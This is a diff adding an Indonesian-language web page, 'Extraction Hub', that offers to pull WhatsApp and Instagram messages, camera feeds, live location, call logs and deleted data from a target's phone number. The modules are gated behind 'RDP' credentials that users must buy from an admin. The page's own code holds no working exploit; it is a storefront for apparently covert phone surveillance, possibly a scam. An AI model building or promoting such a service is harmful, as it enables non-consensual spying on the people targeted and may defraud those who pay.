@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Extraction Hub | Digital Informatic</title>
+    <!-- Favicon -->
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#8b5cf6">
+    <meta name="msapplication-TileColor" content="#050508">
+    <meta name="theme-color" content="#050508">
+    <!-- Fonts & Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@300;400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <style>
+        :root {
+            --accent: #8b5cf6;
+            --accent-soft: rgba(139, 92, 246, 0.1);
+            --bg-deep: #050508;
+            --surface: rgba(18, 18, 26, 0.7);
+            --border: rgba(255, 255, 255, 0.06);
+        }
+
+        body {
+            background-color: var(--bg-deep);
+            color: #e2e8f0;
+            font-family: 'Lexend', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+            scroll-behavior: smooth;
+            opacity: 0;
+            transition: opacity 0.8s;
+        }
+
+        .mono { font-family: 'Fira Code', monospace; }
+
+        /* Background Effects */
+        .glow-orb {
+            position: fixed;
+            width: 50vw;
+            height: 50vw;
+            background: radial-gradient(circle, rgba(139, 92, 246, 0.05) 0%, transparent 70%);
+            border-radius: 50%;
+            z-index: -1;
+            filter: blur(60px);
+            pointer-events: none;
+        }
+
+        .bg-grid {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            background-image: radial-gradient(var(--border) 1px, transparent 1px);
+            background-size: 40px 40px;
+            mask-image: linear-gradient(to bottom, black, transparent);
+        }
+
+        /* Glass Components */
+        .glass-panel {
+            background: var(--surface);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+
+        .module-card {
+            border-radius: 2.5rem;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+        }
+
+        .module-card:hover {
+            border-color: rgba(139, 92, 246, 0.3);
+            background: rgba(18, 18, 26, 0.9);
+            transform: translateY(-8px);
+        }
+
+        .module-card.selected {
+            border-color: var(--accent);
+            background: rgba(139, 92, 246, 0.05);
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.15);
+        }
+
+        /* Tactical Scanner Animation */
+        .laser-scan {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            box-shadow: 0 0 15px var(--accent);
+            opacity: 0;
+            z-index: 10;
+        }
+
+        .selected .laser-scan {
+            opacity: 1;
+            animation: scan-vertical 3s infinite linear;
+        }
+
+        @keyframes scan-vertical {
+            0% { top: 0%; }
+            100% { top: 100%; }
+        }
+
+        /* Tactical Button */
+        .btn-shadow {
+            background: var(--accent);
+            color: white;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.2);
+        }
+
+        .btn-shadow:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(139, 92, 246, 0.4);
+            background: #7c3aed;
+        }
+
+        .btn-shadow:disabled {
+            background: #1e1e2e;
+            color: #4b5563;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        /* Modal Blur */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        .modal-overlay.active { display: flex; }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg-deep); }
+        ::-webkit-scrollbar-thumb { background: #1e1e2e; border-radius: 10px; }
+
+        .hud-text {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--accent);
+        }
+        
+        /* Loading Animation */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(139, 92, 246, 0.3);
+            border-radius: 50%;
+            border-top-color: #8b5cf6;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Notification */
+        #notification-box {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            left: 20px;
+            z-index: 9999;
+            transform: translateY(200%);
+            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @media (min-width: 768px) {
+            #notification-box {
+                left: auto;
+                width: 380px;
+            }
+        }
+
+        #notification-box.show { transform: translateY(0); }
+    </style>
+</head>
+<body class="p-6 md:p-12">
+    <div class="glow-orb" style="top: -10%; left: -10%;"></div>
+    <div class="glow-orb" style="bottom: -10%; right: -10%; background: radial-gradient(circle, rgba(59, 130, 246, 0.05) 0%, transparent 70%);"></div>
+    <div class="bg-grid"></div>
+    
+    <!-- Notification -->
+    <div id="notification-box" class="glass-panel p-5 md:p-6 rounded-2xl shadow-2xl border-l-4 border-l-violet-500">
+        <div class="flex items-start gap-4">
+            <div class="w-8 h-8 rounded-full bg-violet-500/20 flex items-center justify-center text-violet-500 shrink-0">
+                <i class="fas fa-info-circle text-xs md:text-sm"></i>
+            </div>
+            <div>
+                <h6 id="notif-title" class="font-bold text-xs md:text-sm mb-1 uppercase tracking-tight">Pesan Sistem</h6>
+                <p id="notif-text" class="text-[10px] md:text-xs text-slate-500 leading-relaxed"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Navigation Bar -->
+    <nav class="fixed top-6 left-1/2 -translate-x-1/2 w-[90%] max-w-7xl flex justify-between items-center px-8 py-4 glass-panel rounded-full z-50">
+        <div class="flex items-center gap-3 cursor-pointer" onclick="goBack()">
+            <div class="w-10 h-10 bg-violet-600 rounded-xl flex items-center justify-center shadow-lg shadow-violet-900/40">
+                <i class="fas fa-microchip text-white text-lg"></i>
+            </div>
+            <span class="font-bold text-lg tracking-tighter uppercase hidden sm:block">DIGITAL<span class="text-violet-500">INFORMATIC</span></span>
+        </div>
+        
+        <div class="flex items-center gap-6">
+            <div class="hidden lg:flex items-center gap-4 px-4 py-2 bg-white/5 rounded-full border border-white/5">
+                <span class="w-1.5 h-1.5 rounded-full bg-violet-500 animate-pulse"></span>
+                <span class="mono text-[10px] text-slate-400">TARGET: <span id="targetDisplay">+62-XXX-XXXX-XX</span></span>
+            </div>
+            <div class="w-2 h-8 bg-white/5 rounded-full hidden md:block"></div>
+            <span class="mono text-[10px] text-violet-500 font-bold hidden md:block uppercase tracking-widest">Active Link</span>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto pt-32 pb-40 text-center">
+        <div class="mb-16">
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-violet-500/10 border border-violet-500/20 text-violet-400 text-[10px] mono mb-8 uppercase tracking-widest">
+                Modul Konfigurasi Terenkripsi
+            </div>
+            <h1 class="text-5xl md:text-7xl font-extrabold tracking-tighter mb-6 leading-none text-white">
+                Pilih Modul <span class="text-transparent bg-clip-text bg-gradient-to-r from-violet-400 to-indigo-500 italic">Ekstraksi</span>
+            </h1>
+            <p class="text-slate-400 max-w-2xl mx-auto text-lg mb-4">
+                Tentukan target data spesifik yang akan disinkronkan dari perangkat subjek.
+            </p>
+            <p class="text-violet-500/60 mono text-[10px] uppercase tracking-[0.3em] font-bold">
+                Maksimal 1 Modul Per Sesi
+            </p>
+        </div>
+
+        <!-- Grid Modules -->
+        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 md:gap-8 max-w-6xl mx-auto px-4">
+            <!-- WhatsApp -->
+            <div class="glass-panel module-card p-8 flex flex-col items-center text-center group" onclick="toggleFeature(this, 'WhatsApp')">
+                <div class="laser-scan"></div>
+                <div class="w-16 h-16 bg-green-500/10 rounded-2xl flex items-center justify-center text-green-500 mb-6 border border-green-500/20 group-hover:scale-110 transition-transform">
+                    <i class="fab fa-whatsapp text-2xl"></i>
+                </div>
+                <h4 class="font-bold text-lg mb-1">WhatsApp</h4>
+                <p class="text-[9px] mono text-slate-500 uppercase tracking-widest font-bold">Chats & Media</p>
+            </div>
+
+            <!-- Instagram -->
+            <div class="glass-panel module-card p-8 flex flex-col items-center text-center group" onclick="toggleFeature(this, 'Instagram')">
+                <div class="laser-scan"></div>
+                <div class="w-16 h-16 bg-pink-500/10 rounded-2xl flex items-center justify-center text-pink-500 mb-6 border border-pink-500/20 group-hover:scale-110 transition-transform">
+                    <i class="fab fa-instagram text-2xl"></i>
+                </div>
+                <h4 class="font-bold text-lg mb-1">Instagram</h4>
+                <p class="text-[9px] mono text-slate-500 uppercase tracking-widest font-bold">DMs & Stories</p>
+            </div>
+
+            <!-- Camera -->
+            <div class="glass-panel module-card p-8 flex flex-col items-center text-center group" onclick="toggleFeature(this, 'Tracking Kamera')">
+                <div class="laser-scan"></div>
+                <div class="w-16 h-16 bg-violet-500/10 rounded-2xl flex items-center justify-center text-violet-500 mb-6 border border-violet-500/20 group-hover:scale-110 transition-transform">
+                    <i class="fas fa-video text-2xl"></i>
+                </div>
+                <h4 class="font-bold text-lg mb-1">Remote Camera</h4>
+                <p class="text-[9px] mono text-slate-500 uppercase tracking-widest font-bold">Visual Feed</p>
+            </div>
+
+            <!-- GPS -->
+            <div class="glass-panel module-card p-8 flex flex-col items-center text-center group" onclick="toggleFeature(this, 'Lokasi')">
+                <div class="laser-scan"></div>
+                <div class="w-16 h-16 bg-red-500/10 rounded-2xl flex items-center justify-center text-red-500 mb-6 border border-red-500/20 group-hover:scale-110 transition-transform">
+                    <i class="fas fa-map-marker-alt text-2xl"></i>
+                </div>
+                <h4 class="font-bold text-lg mb-1">Geospatial</h4>
+                <p class="text-[9px] mono text-slate-500 uppercase tracking-widest font-bold">Live Tracking</p>
+            </div>
+
+            <!-- Facebook -->
+            <div class="glass-panel module-card p-8 flex flex-col items-center text-center group" onclick="toggleFeature(this, 'Facebook')">
+                <div class="laser-scan"></div>
+                <div class="w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-500 mb-6 border border-blue-600/20 group-hover:scale-110 transition-transform">
+                    <i class="fab fa-facebook text-2xl"></i>
+                </div>
+                <h4 class="font-bold text-lg mb-1">Facebook</h4>
+                <p class="text-[9px] mono text-slate-500 uppercase tracking-widest font-bold">Messenger</p>
+            </div>
+
+            <!-- Gallery -->
+            <div class="glass-panel module-card p-8 flex flex-col items-center text-center group" onclick="toggleFeature(this, 'Galeri')">
+                <div class="laser-scan"></div>
+                <div class="w-16 h-16 bg-amber-500/10 rounded-2xl flex items-center justify-center text-amber-500 mb-6 border border-amber-500/20 group-hover:scale-110 transition-transform">
+                    <i class="fas fa-images text-2xl"></i>
+                </div>
+                <h4 class="font-bold text-lg mb-1">Gallery</h4>
+                <p class="text-[9px] mono text-slate-500 uppercase tracking-widest font-bold">Data Media</p>
+            </div>
+
+            <!-- Call Logs -->
+            <div class="glass-panel module-card p-8 flex flex-col items-center text-center group" onclick="toggleFeature(this, 'Panggilan')">
+                <div class="laser-scan"></div>
+                <div class="w-16 h-16 bg-slate-500/10 rounded-2xl flex items-center justify-center text-slate-400 mb-6 border border-white/5 group-hover:scale-110 transition-transform">
+                    <i class="fas fa-phone-alt text-2xl"></i>
+                </div>
+                <h4 class="font-bold text-lg mb-1">Call Logs</h4>
+                <p class="text-[9px] mono text-slate-500 uppercase tracking-widest font-bold">Voice History</p>
+            </div>
+
+            <!-- Deleted -->
+            <div class="glass-panel module-card p-8 flex flex-col items-center text-center group" onclick="toggleFeature(this, 'Pesan Terhapus')">
+                <div class="laser-scan"></div>
+                <div class="w-16 h-16 bg-indigo-500/10 rounded-2xl flex items-center justify-center text-indigo-400 mb-6 border border-indigo-500/20 group-hover:scale-110 transition-transform">
+                    <i class="fas fa-trash-restore text-2xl"></i>
+                </div>
+                <h4 class="font-bold text-lg mb-1">Recycle Bin</h4>
+                <p class="text-[9px] mono text-slate-500 uppercase tracking-widest font-bold">Deleted Data</p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Floating Action Bar -->
+    <div class="fixed bottom-10 left-1/2 -translate-x-1/2 w-[90%] max-w-5xl z-50">
+        <div class="glass-panel rounded-full p-4 md:p-6 flex flex-col md:flex-row items-center justify-between gap-6 shadow-2xl">
+            <div class="flex items-center gap-6 pl-4">
+                <div class="w-12 h-12 rounded-full bg-violet-500/10 border border-violet-500/20 flex items-center justify-center text-violet-500">
+                    <i class="fas fa-fingerprint"></i>
+                </div>
+                <div class="text-left">
+                    <p class="mono text-[9px] text-slate-500 uppercase tracking-widest mb-1">Target Selection</p>
+                    <p id="selectionText" class="font-black text-xl italic text-slate-700 tracking-tight">NULL_MODULE</p>
+                </div>
+            </div>
+            
+            <button id="startBtn" onclick="openRdpModal()" disabled class="btn-shadow px-16 py-4 rounded-full font-bold text-sm uppercase tracking-widest w-full md:w-auto">
+                Initialize Uplink
+            </button>
+        </div>
+    </div>
+
+    <!-- RDP AUTH MODAL -->
+    <div id="rdpModal" class="modal-overlay">
+        <div class="glass-panel p-8 md:p-12 max-w-lg w-full rounded-[3rem] relative bg-[#0a0a0f] border-white/10 shadow-2xl">
+            <button onclick="closeRdpModal()" class="absolute top-8 right-8 w-10 h-10 rounded-full hover:bg-white/5 flex items-center justify-center transition-colors">
+                <i class="fas fa-times text-slate-500"></i>
+            </button>
+            
+            <div class="text-center mb-10">
+                <div class="w-20 h-20 bg-violet-600/10 rounded-3xl flex items-center justify-center mx-auto mb-6 border border-violet-600/30">
+                    <i class="fas fa-shield-halved text-violet-500 text-3xl"></i>
+                </div>
+                <h3 class="text-2xl font-black italic tracking-tighter uppercase text-white">Otorisasi RDP</h3>
+                <p class="mono text-[10px] text-slate-500 mt-2 tracking-widest uppercase italic">Silahkan menghubungi admin untuk membeli akun otorisasi Anda</p>
+            </div>
+
+            <form id="rdpLoginForm" class="space-y-6">
+                <div class="space-y-2">
+                    <label class="mono text-[9px] text-slate-500 ml-2 uppercase">Operator Identifier</label>
+                    <div class="relative">
+                        <i class="fas fa-user-secret absolute left-5 top-1/2 -translate-y-1/2 text-slate-600"></i>
+                        <input type="text" id="rdpUser" placeholder="ID-OP-X7..." class="w-full h-14 bg-white/5 border border-white/10 rounded-2xl pl-14 pr-6 text-white text-sm focus:border-violet-500 focus:outline-none transition-all" required>
+                    </div>
+                </div>
+
+                <div class="space-y-2">
+                    <label class="mono text-[9px] text-slate-500 ml-2 uppercase">Private Security Key</label>
+                    <div class="relative">
+                        <i class="fas fa-key absolute left-5 top-1/2 -translate-y-1/2 text-slate-600"></i>
+                        <input type="password" id="rdpPass" placeholder="••••••••" class="w-full h-14 bg-white/5 border border-white/10 rounded-2xl pl-14 pr-14 text-white text-sm focus:border-violet-500 focus:outline-none transition-all" required>
+                        <i class="fas fa-eye absolute right-5 top-1/2 -translate-y-1/2 text-violet-500/50 cursor-pointer hover:text-violet-400" onclick="togglePasswordVisibility()"></i>
+                    </div>
+                </div>
+
+                <button type="submit" id="authBtn" class="btn-shadow w-full py-5 rounded-2xl font-black text-sm uppercase tracking-widest mt-4">
+                    Verify Linkage
+                </button>
+                
+                <div id="authError" class="hidden text-red-500 text-[10px] text-center font-bold uppercase tracking-[0.2em] mt-4 animate-pulse">
+                    <i class="fas fa-exclamation-triangle mr-2"></i> ERROR: Invalid Credentials
+                </div>
+            </form>
+            
+            <p class="text-center text-[9px] text-slate-600 uppercase mt-8 tracking-widest leading-loose">
+                Contact central admin to procure <br> valid RDP credentials.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE_URL = window.location.origin;
+        
+        let selectedModule = null;
+
+        window.onload = () => {
+            document.body.style.opacity = '1';
+            
+            // Ambil nomor telepon dari URL atau localStorage
+            const urlParams = new URLSearchParams(window.location.search);
+            const phone = urlParams.get('phone') || localStorage.getItem('target_phone') || '+62-XXX-XXXX-XX';
+            document.getElementById('targetDisplay').innerText = phone;
+            
+            // Animate cards
+            const cards = document.querySelectorAll('.module-card');
+            cards.forEach((card, index) => {
+                card.style.opacity = '0';
+                card.style.transform = 'translateY(20px)';
+                setTimeout(() => {
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }, 100 * index);
+            });
+        };
+
+        function goBack() {
+            window.history.back();
+        }
+
+        function toggleFeature(el, name) {
+            const allCards = document.querySelectorAll('.module-card');
+            
+            if (selectedModule === name) {
+                selectedModule = null;
+                el.classList.remove('selected');
+            } else {
+                allCards.forEach(card => card.classList.remove('selected'));
+                selectedModule = name;
+                el.classList.add('selected');
+                
+                el.style.transform = 'scale(0.95)';
+                setTimeout(() => el.style.transform = '', 100);
+            }
+            updateUI();
+        }
+
+        function updateUI() {
+            const text = document.getElementById('selectionText');
+            const btn = document.getElementById('startBtn');
+
+            if (selectedModule) {
+                text.innerText = selectedModule.toUpperCase();
+                text.classList.remove('text-slate-700');
+                text.classList.add('text-violet-500', 'animate-pulse');
+                btn.disabled = false;
+            } else {
+                text.innerText = "NULL_MODULE";
+                text.classList.add('text-slate-700');
+                text.classList.remove('text-violet-500', 'animate-pulse');
+                btn.disabled = true;
+            }
+        }
+
+        function openRdpModal() {
+            document.getElementById('rdpModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeRdpModal() {
+            document.getElementById('rdpModal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+            document.getElementById('authError').classList.add('hidden');
+        }
+
+        function togglePasswordVisibility() {
+            const passInput = document.getElementById('rdpPass');
+            passInput.type = passInput.type === 'password' ? 'text' : 'password';
+        }
+
+        function showNotif(title, text) {
+            const box = document.getElementById('notification-box');
+            document.getElementById('notif-title').innerText = title;
+            document.getElementById('notif-text').innerText = text;
+            box.classList.add('show');
+            setTimeout(() => box.classList.remove('show'), 5000);
+        }
+
+        document.getElementById('rdpLoginForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('authBtn');
+            const errorDiv = document.getElementById('authError');
+            const user = document.getElementById('rdpUser').value.trim();
+            const pass = document.getElementById('rdpPass').value.trim();
+            
+            btn.disabled = true;
+            btn.innerHTML = `<div class="spinner mr-3 inline-block"></div> Synchronizing...`;
+            errorDiv.classList.add('hidden');
+
+            try {
+                // Simulasi pengecekan kredensial
+                await new Promise(r => setTimeout(r, 2000));
+                
+                // Validasi dasar
+                if (!user || !pass) {
+                    throw new Error('Masukkan kredensial yang valid');
+                }
+
+    // ✅ Validasi ke backend (real)
+    const phone =
+  new URLSearchParams(window.location.search).get("phone") ||
+  localStorage.getItem("target_phone") ||
+  "";
+
+const res = await fetch(`/api/rdp/auth`, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    username: user,
+    password: pass,
+    phone: phone
+  })
+});
+
+const data = await res.json();
+console.log("RDP AUTH STATUS:", res.status);
+console.log("RDP AUTH DATA:", data);
+
+if (!res.ok || !data.success) {
+  throw new Error(data.error || "Kredensial tidak valid");
+  localStorage.setItem("client_name", data.name || "");
+  localStorage.setItem("target_phone", phone || "");
+}
+
+// ✅ kalau success, pakai UI sukses yang sama seperti versi hardcoded
+btn.innerHTML = `<i class="fas fa-check mr-3"></i> Authenticated`;
+btn.style.background = '#10b981';
+
+// Simpan data sesi
+localStorage.setItem('selected_module', selectedModule);
+localStorage.setItem('target_phone', document.getElementById('targetDisplay').innerText);
+
+showNotif('SUKSES', 'Otentikasi berhasil! Mengalihkan ke dashboard...');
+
+setTimeout(() => {
+  window.location.href = 'proses2';
+}, 1500);
+
+            } catch (err) {
+                btn.disabled = false;
+                btn.innerHTML = `Verify Linkage`;
+                errorDiv.classList.remove('hidden');
+                errorDiv.innerHTML = `<i class="fas fa-exclamation-triangle mr-2"></i> ERROR: ${err.message}`;
+                showNotif('GAGAL', 'Otentikasi gagal. Periksa kredensial Anda.');
+            }
+        };
+    </script>
+</body>
+</html>
